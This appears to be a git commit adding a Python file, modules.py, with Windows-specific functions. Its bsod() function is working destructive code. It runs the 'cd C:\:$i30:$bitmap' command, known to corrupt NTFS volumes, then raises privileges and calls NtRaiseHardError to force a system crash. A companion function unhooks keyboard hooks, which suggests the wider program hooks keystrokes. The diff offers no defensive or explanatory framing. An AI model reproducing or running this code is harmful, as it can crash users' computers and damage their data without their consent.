e5891bc933b94cf17f6ce46bf2b657d5c4da3d17
Nguyễn Quang Hưng <105227731+QuangHuwngg@users.noreply.github.com>
2023-12-24 16:15:50 +0700

    Add files via upload

---
+++ modules.py
@@ -0,0 +1,15 @@
+import getpass
+import os
+import keyboard
+import ctypes
+import subprocess
+import ctypes.wintypes
+
+def bsod():
+	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
+	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
+
+def uninstall(wind):
+	wind.destroy()
+	keyboard.unhook_all()
